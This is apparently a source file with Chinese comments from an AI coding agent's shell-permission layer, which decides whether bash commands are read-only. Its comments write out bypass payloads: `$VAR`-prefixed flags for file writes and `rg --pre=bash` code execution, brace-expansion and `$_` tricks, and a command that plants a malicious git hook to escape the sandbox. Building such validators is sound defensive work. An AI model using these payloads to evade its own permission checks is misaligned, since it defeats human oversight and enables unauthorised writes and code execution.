          // defense-in-depth：即便 -S somehow 穿过了 validateFlags，这里也要再拦一次。
          if (token === '-S') return true
          // 还要拦截与其他 flag 绑定在一起的 -S（例如 -xS）。
          if (
            !token.startsWith('--') &&
            token.length > 2 &&
            token.includes('S')
          )
            return true
          if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          if (DANGEROUS_CAPABILITIES.has(token)) return true
          i++
        }
      }
      return false
    },
  },

  // ss：socket statistics（iproute2）。与 netstat 类似的只读查询工具。
  // 安全性：故意排除了 -K/--kill（强制关闭 socket）和 -D/--diag（把原始数据 dump 到文件）。
  // 同时也排除了 -F/--filter（从文件读取 filter 表达式）。
  ss: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
      '-n': 'none',
      '--numeric': 'none',
      '-r': 'none',
      '--resolve': 'none',
      '-a': 'none',
      '--all': 'none',
      '-l': 'none',
      '--listening': 'none',
      '-o': 'none',
      '--options': 'none',
      '-e': 'none',
      '--extended': 'none',
      '-m': 'none',
      '--memory': 'none',
      '-p': 'none',
      '--processes': 'none',
      '-i': 'none',
      '--info': 'none',
      '-s': 'none',
      '--summary': 'none',
      '-4': 'none',
      '--ipv4': 'none',
      '-6': 'none',
      '--ipv6': 'none',
      '-0': 'none',
      '--packet': 'none',
      '-t': 'none',
      '--tcp': 'none',
      '-M': 'none',
      '--mptcp': 'none',
      '-S': 'none',
      '--sctp': 'none',
      '-u': 'none',
      '--udp': 'none',
      '-d': 'none',
      '--dccp': 'none',
      '-w': 'none',
      '--raw': 'none',
      '-x': 'none',
      '--unix': 'none',
      '--tipc': 'none',
      '--vsock': 'none',
      '-f': 'string',
      '--family': 'string',
      '-A': 'string',
      '--query': 'string',
      '--socket': 'string',
      '-Z': 'none',
      '--context': 'none',
      '-z': 'none',
      '--contexts': 'none',
      // 安全性：排除了 -N/--net。它会通过 setns()、unshare()、mount()、umount()
      // 切换 network namespace。虽然作用域只限于 fork 出来的进程，但仍过于激进。
      '-b': 'none',
      '--bpf': 'none',
      '-E': 'none',
      '--events': 'none',
      '-H': 'none',
      '--no-header': 'none',
      '-O': 'none',
      '--oneline': 'none',
      '--tipcinfo': 'none',
      '--tos': 'none',
      '--cgroup': 'none',
      '--inet-sockopt': 'none',
      // 安全性：排除了 -K/--kill —— 会强制关闭 socket
      // 安全性：排除了 -D/--diag —— 会把原始 TCP 数据 dump 到文件
      // 安全性：排除了 -F/--filter —— 会从文件读取 filter 表达式
    },
  },

  // fd/fdfind：快速文件查找器（fd-find），属于只读搜索工具。
  // 安全性：故意排除了 -x/--exec（对每个结果执行命令）和 -X/--exec-batch
  // （把所有结果一起喂给某个命令执行）。
  fd: { safeFlags: { ...FD_SAFE_FLAGS } },
  // fdfind 是 Debian/Ubuntu 对 fd 的包名，本质上是同一个二进制与同一套 flag。
  fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },

  ...PYRIGHT_READ_ONLY_COMMANDS,
  ...DOCKER_READ_ONLY_COMMANDS,
}

// gh 命令是 ant-only，因为它们会发起网络请求，这与只读校验“不允许网络访问”的原则冲突。
const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // 来自共享校验映射的全部 gh 只读命令。
  ...GH_READ_ONLY_COMMANDS,
  // aki：Anthropic 内部知识库搜索 CLI。
  // 它属于“网络只读”工具（与 gh 同一策略）。--audit-csv 被省略，因为它会写磁盘。
  aki: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-k': 'none',
      '--keyword': 'none',
      '-s': 'none',
      '--semantic': 'none',
      '--no-adaptive': 'none',
      '-n': 'number',
      '--limit': 'number',
      '-o': 'number',
      '--offset': 'number',
      '--source': 'string',
      '--exclude-source': 'string',
      '-a': 'string',
      '--after': 'string',
      '-b': 'string',
      '--before': 'string',
      '--collection': 'string',
      '--drive': 'string',
      '--folder': 'string',
      '--descendants': 'none',
      '-m': 'string',
      '--meta': 'string',
      '-t': 'string',
      '--threshold': 'string',
      '--kw-weight': 'string',
      '--sem-weight': 'string',
      '-j': 'none',
      '--json': 'none',
      '-c': 'none',
      '--chunk': 'none',
      '--preview': 'none',
      '-d': 'none',
      '--full-doc': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--stats': 'none',
      '-S': 'number',
      '--summarize': 'number',
      '--explain': 'none',
      '--examine': 'string',
      '--url': 'string',
      '--multi-turn': 'number',
      '--multi-turn-model': 'string',
      '--multi-turn-context': 'string',
      '--no-rerank': 'none',
      '--audit': 'none',
      '--local': 'none',
      '--staging': 'none',
    },
  },
}

function getCommandAllowlist(): Record<string, CommandConfig> {
  let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
  // 在 Windows 上，xargs 可以充当“数据到代码”的桥：如果文件内容里包含 UNC 路径，
  // `cat file | xargs cat` 会把这个路径喂给 cat，进而触发 SMB 解析。
  // 因为 UNC 路径存在于文件内容中，而不是命令字符串里，
  // 所以基于 regex 的检测无法捕获这种情况。
  if (getPlatform() === 'windows') {
    const { xargs: _, ...rest } = allowlist
    allowlist = rest
  }
  if (process.env.USER_TYPE === 'ant') {
    return { ...allowlist, ...ANT_ONLY_COMMAND_ALLOWLIST }
  }
  return allowlist
}

/**
 * 可以安全作为 xargs 目标并参与自动批准的命令。
 *
 * 安全性：只有当某个命令不存在以下任意危险 flag 时，才可以加入此列表：
 * 1. 会写文件（如 find 的 -fprint、sed 的 -i）
 * 2. 会执行代码（如 find 的 -exec、awk 的 system()、perl 的 -e）
 * 3. 会发起网络请求
 *
 * 这些命令必须是纯粹的只读工具。一旦 xargs 以其中某个命令作为 target，
 * 我们就会在 target command 之后停止继续校验 flag
 * （见 isCommandSafeViaFlagParsing 里的 `break`），
 * 因此命令本身不能只是“有安全子集”，而必须完全不存在危险 flag。
 *
 * 这里的每个命令都已通过 man page 检查，确认不存在危险能力。
 */
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
  'echo', // 仅输出，没有危险 flag
  'printf', // xargs 运行的是 /usr/bin/printf（二进制），不是 bash builtin，因此没有 -v 能力
  'wc', // 只读计数，没有危险 flag
  'grep', // 只读搜索，没有危险 flag
  'head', // 只读，没有危险 flag
  'tail', // 只读（包括 -f follow），没有危险 flag
]

/**
 * 统一的命令校验函数，用来替代各个分散的 validator 函数。
 * 它会使用 COMMAND_ALLOWLIST 中的声明式配置来校验命令及其 flag，
 * 并处理组合 flag、参数校验以及 shell quoting 绕过检测。
 */
export function isCommandSafeViaFlagParsing(command: string): boolean {
  // 用 shell-quote 解析命令，拿到准确的 token 列表。
  // 其中 glob operator 会被转成字符串，因为从本函数视角看它们并不重要。
  const parseResult = tryParseShellCommand(command, env => `$${env}`)
  if (!parseResult.success) return false

  const parsed = parseResult.tokens.map(token => {
    if (typeof token !== 'string') {
      token = token as { op: 'glob'; pattern: string }
      if (token.op === 'glob') {
        return token.pattern
      }
    }
    return token
  })

  // 如果命令中包含操作符（管道、重定向等），它就不是单纯的 simple command。
  // 对命令做拆分的工作已经在本函数上游完成，因此这里只要看到操作符就直接拒绝。
  const hasOperators = parsed.some(token => typeof token !== 'string')
  if (hasOperators) {
    return false
  }

  // 到这里为止，可以确认所有 token 都是字符串。
  const tokens = parsed as string[]

  if (tokens.length === 0) {
    return false
  }

  // 找到匹配的命令配置。
  let commandConfig: CommandConfig | undefined
  let commandTokens: number = 0

  // 优先检查多词命令（例如 "git diff"、"git stash list"）。
  const allowlist = getCommandAllowlist()
  for (const [cmdPattern] of Object.entries(allowlist)) {
    const cmdTokens = cmdPattern.split(' ')
    if (tokens.length >= cmdTokens.length) {
      let matches = true
      for (let i = 0; i < cmdTokens.length; i++) {
        if (tokens[i] !== cmdTokens[i]) {
          matches = false
          break
        }
      }
      if (matches) {
        commandConfig = allowlist[cmdPattern]
        commandTokens = cmdTokens.length
        break
      }
    }
  }

  if (!commandConfig) {
    return false // 命令不在 allowlist 中。
  }

  // 对 git ls-remote 做特殊处理，拒绝那些可能导致数据外传的 URL。
  if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
    // 检查是否有参数看起来像 URL 或 remote specification。
    for (let i = 2; i < tokens.length; i++) {
      const token = tokens[i]
      if (token && !token.startsWith('-')) {
        // 拒绝 HTTP/HTTPS URL。
        if (token.includes('://')) {
          return false
        }
        // 拒绝类似 git@github.com:user/repo.git 的 SSH URL。
        if (token.includes('@') || token.includes(':')) {
          return false
        }
        // 拒绝变量引用。
        if (token.includes('$')) {
          return false
        }
      }
    }
  }

  // 安全性：拒绝任何包含 `$` 的 token（变量展开）。
  // line 825 上的 `env => \`$${env}\`` 回调会把 `$VAR` 以“字面文本”的形式保留在 token 中，
  // 但 bash 会在运行时展开它（未设置的变量会变成空字符串）。
  // 这种解析器差异会同时绕过 validateFlags 与 callback：
  //
  //   (1) `$VAR` 前缀会绕过 validateFlags 的 `startsWith('-')` 检查：
  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
  //       由于它以 `$` 开头，在 ~:1730 会被当作位置参数直接放过。
  //       bash 实际运行的是 `git diff --output=/tmp/pwned`。
  //       结果是任意文件写入，零权限。
  //
  //   (2) `$VAR` 前缀可通过 `rg --pre` 触发 RCE：
  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
  //       这里会执行 `bash FILE`。而 rg 的配置既没有 regex，也没有 callback。
  //       这是单步任意代码执行。
  //
  //   (3) `$VAR` 内嵌在 token 中时，会绕过 additionalCommandIsDangerousCallback 的 regex：
  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` 会因为 `$` 而匹配失败，于是被认为“not dangerous”。
  //       但 bash 实际运行的是 `ps axe`，会显示所有进程的环境变量。
  //       如果只修复“以 `$` 为前缀”的 token，这种情况仍然关不住。
  //
  // 因此这里会检查命令前缀之后的所有 token。只要出现 `$`，
  // 我们就无法确定运行时真正的 token 值，也就无法验证它是否满足只读安全性。
  // 这项检查必须在 validateFlags 之前、也必须在 callbacks 之前执行。
  for (let i = commandTokens; i < tokens.length; i++) {
    const token = tokens[i]
    if (!token) continue
    // 拒绝任何包含 $ 的 token（变量展开）。
    if (token.includes('$')) {
      return false
    }
    // 同时拒绝包含 `{` 与 `,` 的 token（brace expansion 混淆）。
    // `git diff {@'{'0},--output=/tmp/pwned}` 中，shell-quote 会去掉引号，
    // 于是得到 token `{@{0},--output=/tmp/pwned}`，它同时含有 `{` 与 `,`，
    // 这就是 brace expansion。
    // 这里与 bashSecurity.ts 里的 validateBraceExpansion 共同构成 defense-in-depth。
    // 之所以要求同时包含 `{` 和 `,`，是为了避免误伤合法模式：
    // `stash@{0}`（git ref，只有 `{` 没有 `,`）、`{{.State}}`（Go template，没有 `,`）、
    // `prefix-{}-suffix`（xargs，没有 `,`）。
    // 序列表达式 `{1..5}` 也需要拦截，因此这里还会额外检查 `..`。
    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
      return false
    }
  }

  // 从命令 token 之后开始校验 flag。
  if (
    !validateFlags(tokens, commandTokens, commandConfig, {
      commandName: tokens[0],
      rawCommand: command,
      xargsTargetCommands:
        tokens[0] === 'xargs' ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
    })
  ) {
    return false
  }

  if (commandConfig.regex && !commandConfig.regex.test(command)) {
    return false
  }
  if (!commandConfig.regex && /`/.test(command)) {
    return false
  }
  // 拦截 grep/rg pattern 中的换行与回车，因为它们可能被用来做注入。
  if (
    !commandConfig.regex &&
    (tokens[0] === 'rg' || tokens[0] === 'grep') &&
    /[\n\r]/.test(command)
  ) {
    return false
  }
  if (
    commandConfig.additionalCommandIsDangerousCallback &&
    commandConfig.additionalCommandIsDangerousCallback(
      command,
      tokens.slice(commandTokens),
    )
  ) {
    return false
  }

  return true
}

/**
 * 创建一个用于匹配命令安全调用形式的正则模式。
 *
 * 该正则会通过拦截以下内容来确保命令调用是安全的：
 * - 可能导致命令注入或重定向的 shell 元字符
 * - 通过反引号或 $() 触发的命令替换
 * - 可能携带恶意载荷的变量展开
 * - 环境变量赋值式绕过（command=value）
 *
 * @param command 命令名（例如 'date'、'npm list'、'ip addr'）
 * @returns 能匹配该命令安全调用形式的 RegExp
 */
function makeRegexForSafeCommand(command: string): RegExp {
  // 构造正则模式：/^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
  return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// 可安全执行的简单命令（会通过 makeRegexForSafeCommand 转成正则模式）。
// 警告：如果要在这里新增命令，必须非常谨慎地确认它们确实安全。
// 这至少包括：
// 1. 确认它们不存在允许写文件或执行命令的 flag
// 2. 使用 makeRegexForSafeCommand() 来生成正确的正则模式
const READONLY_COMMANDS = [
  // 来自共享校验逻辑的跨平台命令。
  ...EXTERNAL_READONLY_COMMANDS,

  // Unix/bash 专属的只读命令（不做共享，因为 PowerShell 中不存在这些命令）。

  // 时间与日期。
  'cal',
  'uptime',

  // 文件内容查看（相对路径由其他逻辑单独处理）。
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'strings',
  'hexdump',
  'od',
  'nl',

  // 系统信息。
  'id',
  'uname',
  'free',
  'df',
  'du',
  'locale',
  'groups',
  'nproc',

  // 路径信息。
  'basename',
  'dirname',
  'realpath',

  // 文本处理。
  'cut',
  'paste',
  'tr',
  'column',
  'tac', // 反向 cat：按相反行序显示文件内容
  'rev', // 反转每一行中的字符
  'fold', // 按指定宽度折行
  'expand', // 把 tab 转为空格
  'unexpand', // 把空格转为 tab
  'fmt', // 简单文本格式化器，只输出到 stdout
  'comm', // 按行比较已排序文件
  'cmp', // 按字节比较文件
  'numfmt', // 数字格式转换

  // 额外的路径信息命令。
  'readlink', // 解析符号链接，显示其目标

  // 文件比较。
  'diff',

  // true 与 false，可用于静默处理或构造错误。
  'true',
  'false',

  // 其他安全命令。
  'sleep',
  'which',
  'type',
  'expr', // 计算表达式（算术、字符串匹配）
  'test', // 条件判断（文件检查、比较）
  'getconf', // 获取系统配置值
  'seq', // 生成数字序列
  'tsort', // 拓扑排序
  'pr', // 为打印而分页文件内容
]

// 需要自定义 regex 模式的复杂命令。
// 警告：如果可能，尽量不要在这里新增 regex，而应优先使用 COMMAND_ALLOWLIST。
// 基于 allowlist 的 CLI flag 校验方式更安全，也能避免 gnu getopt_long 带来的漏洞。
const READONLY_COMMAND_REGEXES = new Set([
  // 把简单命令通过 makeRegexForSafeCommand 转成 regex 模式。
  ...READONLY_COMMANDS.map(makeRegexForSafeCommand),

  // 不会执行命令、也不使用变量的 echo。
  // 允许单引号中的换行（安全），但不允许双引号中的换行（变量展开场景下可能危险）。
  // 同时允许结尾可选的 2>&1 stderr 重定向。
  /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

  // Claude CLI 帮助命令。
  /^claude -h$/,
  /^claude --help$/,

  // Git 只读命令现在统一走 COMMAND_ALLOWLIST，并进行显式 flag 校验
  // （如 git status、git blame、git ls-files、git config --get、git remote、git tag、git branch）。

  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files

  // 系统信息。
  /^pwd$/,
  /^whoami$/,
  // env 与 printenv 已移除，因为它们可能暴露敏感环境变量。

  // 开发工具版本检查：只允许精确匹配，不允许任意后缀。
  // 安全性：`node -v --run <task>` 会执行 package.json 脚本，
  // 因为 Node 处理 --run 的优先级高于 -v。Python/python3 --version 这里也一并做锚定，
  // 作为 defense-in-depth。这些命令过去在 EXTERNAL_READONLY_COMMANDS 中，
  // 会经过 makeRegexForSafeCommand，从而允许任意后缀。
  /^node -v$/,
  /^node --version$/,
  /^python --version$/,
  /^python3 --version$/,

  // 其他安全命令。
  // tree 已迁移到 COMMAND_ALLOWLIST，以便做正确的 flag 校验（拦截 -o/--output）。
  /^history(?:\s+\d+)?\s*$/, // 只允许裸 history 或带数字参数的 history，防止写文件
  /^alias$/,
  /^arch(?:\s+(?:--help|-h))?\s*$/, // 只允许 arch 裸调用，或带 help flag

  // 网络命令：只允许无额外参数的精确命令，防止网络配置被操控。
  /^ip addr$/, // 只允许 "ip addr"，不带额外参数
  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // ifconfig 只允许跟接口名（且必须以字母开头）

  // jq 的 JSON 处理：允许内联 filter 与文件参数。
  // 文件参数会由 pathValidation.ts 单独校验。
  // 这里允许引号中的管道和复杂表达式，但会阻止危险 flag。
  // 同时阻断命令替换，反引号对 jq 来说即便在单引号里也很危险。
  // 还会阻断 -f/--from-file、--rawfile、--slurpfile（把文件读入 jq）、
  // --run-tests、-L/--library-path（加载可执行模块）。
  // 另外也会阻断 `env` builtin 与 `$ENV` 对象，因为它们能访问环境变量（defense in depth）。
  /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

  // 路径类命令（是否允许会由 path validation 再次确认）。
  // cd 命令：允许切换目录
  /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
  // ls 命令：允许列目录
  /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
  // find 命令：拦截危险 flag。
  // 允许作为分组用途的转义括号 \( 与 \)，但阻断未转义括号。
  // 注意：\\[()] 必须放在字符类前面，确保 \( 会被识别成“转义括号”，
  // 而不是“反斜杠 + 括号”（后者会失败，因为括号已被字符类排除）。
  /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * 检查命令是否在“bash 不会把它当字面量”的上下文中包含 glob 字符
 * （?、*、[、]）或可展开的 `$` 变量。
 * 它们一旦展开，就可能绕过基于 regex 的安全检查。
 *
 * Glob 示例：
 * - `python *` 如果当前目录存在名为 `--help` 的文件，就可能展开成 `python --help`
 * - `find ./ -?xec` 如果存在相应文件，就可能展开成 `find ./ -exec`
 * Glob 在单引号和双引号中都会被当成字面量。
 *
 * 变量展开示例：
 * - `uniq --skip-chars=0$_` 中，`$_` 会展开成上一条命令的最后一个参数；
 *   结合 IFS 分词后，它能把位置参数偷偷塞过“仅 flags”类 regex。
 *   `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → 文件写入。
 * - `cd "$HOME"` 中，双引号里的 `$HOME` 仍会在运行时展开。
 * 变量只有在单引号内才会被当成字面量；在双引号或未加引号时都会展开。
 *
 * 这里对 `$` 的检查用于保护 READONLY_COMMAND_REGEXES 这条 fallback 路径。
 * isCommandSafeViaFlagParsing 中的 `$` token 检查只覆盖 COMMAND_ALLOWLIST 命令；
 * 像 uniq 的 `\S+` 或 cd 的 `"[^"]*"` 这类手写 regex 都会放过 `$`。
 * 这里匹配的是 `$` 后跟 `[A-Za-z_@*#?!$0-9-]`，也就是覆盖 `$VAR`、`$_`、`$@`、
 * `$*`、`$#`、`$?`、`$!`、`$$`、`$-`、`$0` 到 `$9`。
 * 它不会匹配 `${` 或 `$(`，因为那两种情况会由 bashSecurity.ts 中的
 * COMMAND_SUBSTITUTION_PATTERNS 负责拦截。
 *
 * @param command 待检查的命令字符串
 * @returns 如果命令包含未加引号的 glob 或可展开的 `$`，则返回 true
 */
function containsUnquotedExpansion(command: string): boolean {
  // 跟踪引号状态，避免把引号内部的模式误判成危险项。
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const currentChar = command[i]

    // 处理转义序列。
    if (escaped) {
      escaped = false
      continue
    }

    // 安全性：只有在单引号外部，反斜杠才应被视为转义符。
    // 在 bash 中，单引号 `'...'` 里的 `\` 只是字面量，不会转义下一个字符。
    // 如果没有这个保护，`'\'` 会把引号跟踪器搞乱：`\` 先把 escaped 设为 true，
    // 然后结束用的 `'` 会被 escaped-skip 吃掉，而不是去切换 inSingleQuote。
    // 结果解析器会在后续整段命令里一直错误地认为自己还在单引号模式中，
    // 从而漏掉后面的所有展开。
    // 例如：`ls '\' *` 中，bash 实际看到的是 glob `*`，
    // 但状态错乱的解析器会误以为 `*` 还在引号内，于是返回 false（未检测到 glob）。
    // 作为 defense-in-depth，hasShellQuoteSingleQuoteBug 会在进入本函数前先拦掉 `'\'` 这种模式；
    // 但这里仍然修正跟踪器，以保持与 bashSecurity.ts 中正确实现的一致性。
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    // 更新引号状态。
    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // 单引号内部所有内容都应视为字面量，直接跳过。
    if (inSingleQuote) {
      continue
    }

    // 检查 `$` 后面是否跟着变量名字符或特殊参数字符。
    // `$` 在双引号和未加引号场景下都会展开；只有单引号里它才是字面量。
    if (currentChar === '$') {
      const next = command[i + 1]
      if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
        return true
      }
    }

    // glob 在双引号中同样是字面量，因此这里只检查未加引号的情况。
    if (inDoubleQuote) {
      continue
    }

    // 检查所有引号之外的 glob 字符。
    // 它们可能展开成任意内容，包括危险 flag。
    if (currentChar && /[?*[\]]/.test(currentChar)) {
      return true
    }
  }

  return false
}

/**
 * 基于 READONLY_COMMAND_REGEXES 检查单条命令字符串是否为只读。
 * 这是一个用于校验单个命令的内部辅助函数。
 *
 * @param command 待检查的命令字符串
 * @returns 如果该命令可判定为只读，则返回 true
 */
function isCommandReadOnly(command: string): boolean {
  // 处理常见的 stderr 重定向到 stdout 的模式。
  // 这既覆盖完整命令末尾的 "command 2>&1"，
  // 也覆盖 pipeline 片段中的 "command 2>&1"。
  let testCommand = command.trim()
  if (testCommand.endsWith(' 2>&1')) {
    // 为了做模式匹配，先移除 stderr 重定向部分。
    testCommand = testCommand.slice(0, -5).trim()
  }

  // 检查是否存在可能遭受 WebDAV 攻击的 Windows UNC 路径。
  // 这一步要尽早执行，避免任何带 UNC 路径的命令被误判为只读。
  if (containsVulnerableUncPath(testCommand)) {
    return false
  }

  // 检查未加引号的 glob 字符和可展开的 `$` 变量，
  // 它们可能绕过基于 regex 的安全检查。由于无法知道运行时具体展开成什么，
  // 我们就无法确认该命令仍然是只读的。
  //
  // Glob 示例：`python *` 如果存在对应文件，可能会展开成 `python --help`。
  //
  // 变量示例：`uniq --skip-chars=0$_` 中，bash 会在运行时把 `$_` 展开成
  // 上一条命令的最后一个参数。配合 IFS 分词，它能把位置参数偷偷塞过
  // 类似 uniq `\S+` 这种“只允许 flag”的 regex。isCommandSafeViaFlagParsing
  // 中的 `$` token 检查只覆盖 COMMAND_ALLOWLIST 命令；
  // READONLY_COMMAND_REGEXES 中的手写 regex（如 uniq、jq、cd）并没有这层保护。
  // 更完整的分析见 containsUnquotedExpansion。
  if (containsUnquotedExpansion(testCommand)) {
    return false
  }

  // 像 git 这类工具允许把 `--upload-pack=cmd` 缩写成 `--up=cmd`。
  // regex 过滤很容易被这种方式绕过，所以这里改用严格的 allowlist 校验。
  // 这要求我们显式定义一组已知安全的 flag。Claude 可以辅助生成，
  // 但仍需要人工复核，确认里面没有允许写文件、执行代码或发起网络请求的 flag。
  if (isCommandSafeViaFlagParsing(testCommand)) {
    return true
  }

  for (const regex of READONLY_COMMAND_REGEXES) {
    if (regex.test(testCommand)) {
      // 拦截带 -c 的 git 命令，避免通过配置项触发代码执行。
      // -c 允许内联设置任意 git config，包括 core.fsmonitor、diff.external、
      // core.gitProxy 等可执行任意命令的危险选项。
      // 这里检查的是前面有空白、后面接空白或等号的 -c，
      // 用 regex 一并覆盖空格、tab 等各种空白字符，避免与 --cached 之类 flag 混淆。
      if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
        return false
      }

      // 拦截带 --exec-path 的 git 命令，避免通过路径操控触发代码执行。
      // --exec-path 允许覆盖 git 查找可执行文件的目录。
      if (
        testCommand.includes('git') &&
        /\s--exec-path[\s=]/.test(testCommand)
      ) {
        return false
      }

      // 拦截带 --config-env 的 git 命令，避免通过环境变量注入配置。
      // --config-env 允许从环境变量设置 git config，
      // 危险程度与 -c 相当（例如同样可影响 core.fsmonitor、diff.external、core.gitProxy）。
      if (
        testCommand.includes('git') &&
        /\s--config-env[\s=]/.test(testCommand)
      ) {
        return false
      }
      return true
    }
  }
  return false
}

/**
 * 检查复合命令中是否包含任何 git 命令。
 *
 * @param command 要检查的完整命令字符串
 * @returns 只要任一子命令是 git 命令，就返回 true
 */
function commandHasAnyGit(command: string): boolean {
  return splitCommand_DEPRECATED(command).some(subcmd =>
    isNormalizedGitCommand(subcmd.trim()),
  )
}

/**
 * 可被用于沙箱逃逸的 git 内部路径模式。
 * 如果某条命令先创建这些文件，再执行 git，
 * git 就可能从这些新建文件中执行恶意 hook。
 */
const GIT_INTERNAL_PATTERNS = [
  /^HEAD$/,
  /^objects(?:\/|$)/,
  /^refs(?:\/|$)/,
  /^hooks(?:\/|$)/,
]

/**
 * 检查某个路径是否属于 git 内部路径（HEAD、objects/、refs/、hooks/）。
 */
function isGitInternalPath(path: string): boolean {
  // 归一化路径，去掉前导的 ./ 或 /。
  const normalized = path.replace(/^\.?\//, '')
  return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

// 只会删除或原地修改内容的命令（不会在新路径上创建新文件）。
const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])

/**
 * 使用 PATH_EXTRACTORS 从子命令中提取写路径。
 * 这里只返回那些可能创建新文件/目录的命令路径，
 * 也就是 write/create 操作中排除了删除与原地修改后的剩余部分。
 */
function extractWritePathsFromSubcommand(subcommand: string): string[] {
  const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
  if (!parseResult.success) return []

  const tokens = parseResult.tokens.filter(
    (t): t is string => typeof t === 'string',
  )
  if (tokens.length === 0) return []

  const baseCmd = tokens[0]
  if (!baseCmd) return []

  // 只考虑那些会在目标路径创建文件的命令。
  if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
    return []
  }
  const opType = COMMAND_OPERATION_TYPE[baseCmd as PathCommand]
  if (
    (opType !== 'write' && opType !== 'create') ||
    NON_CREATING_WRITE_COMMANDS.has(baseCmd)
  ) {
    return []
  }

  const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
  if (!extractor) return []

  return extractor(tokens.slice(1))
}

/**
 * 检查复合命令是否会向任何 git 内部路径写入内容。
 * 这用于识别一种潜在的沙箱逃逸攻击：命令先创建 git 内部文件
 * （HEAD、objects/、refs/、hooks/），随后再执行 git。
 *
 * 安全性：复合命令可以通过以下步骤绕过 bare repo 检测：
 * 1. 在同一条命令里创建 bare git repo 所需文件（HEAD、objects/、refs/、hooks/）
 * 2. 随后立刻执行 git，从而触发恶意 hook
 *
 * 攻击示例：
 * 示例命令：mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
 *
 * @param command 要检查的完整命令字符串
 * @returns 只要任一子命令会写入 git 内部路径，就返回 true
 */
function commandWritesToGitInternalPaths(command: string): boolean {
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcmd of subcommands) {
    const trimmed = subcmd.trim()

    // 检查路径类命令（mkdir、touch、cp、mv）写入的目标路径。
    const writePaths = extractWritePathsFromSubcommand(trimmed)
    for (const path of writePaths) {
      if (isGitInternalPath(path)) {
        return true
      }
    }

    // 检查输出重定向（例如 echo x > hooks/pre-commit）。
    const { redirections } = extractOutputRedirections(trimmed)
    for (const { target } of redirections) {
      if (isGitInternalPath(target)) {
        return true
      }
    }
  }

  return false
}

/**
 * 检查 bash 命令的只读约束。
 * 这是对外导出的唯一函数，用来判断一条命令是否属于只读操作。
 * 它会统一处理复合命令、sandbox 模式以及相关安全检查。
 *
 * @param input 待校验的 bash 命令输入
 * @param compoundCommandHasCd 预先计算好的标记，用于表示复合命令中是否存在 cd。
 *                              该值由 commandHasAnyCd() 计算并传入，以避免重复计算。
 * @returns PermissionResult，用于指示该命令是否可视为只读
 */
export function checkReadOnlyConstraints(
  input: z.infer<typeof BashTool.inputSchema>,
  compoundCommandHasCd: boolean,
): PermissionResult {
  const { command } = input

  // 如果命令本身无法解析，就提前返回。
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) {
    return {
      behavior: 'passthrough',
      message: 'Command cannot be parsed, requires further permission checks',
    }
  }

  // 在拆分前先检查原始命令本身的安全性。
  // 这一步很重要，因为 splitCommand_DEPRECATED 可能会改写命令形态
  // （例如把 ${VAR} 变成 $VAR）。
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return {
      behavior: 'passthrough',
      message: 'Command is not read-only, requires further permission checks',
    }
  }

  // 在命令发生变换前，先检查原始命令里是否存在 Windows UNC 路径。
  // 这一步必须发生在 splitCommand_DEPRECATED 之前，因为它可能会改写反斜杠。
  if (containsVulnerableUncPath(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
    }
  }

  // 先统一检查一次是否存在 git 子命令，供下方多处安全检查复用。
  const hasGitCommand = commandHasAnyGit(command)

  // 安全性：拦截同时包含 cd 与 git 的复合命令。
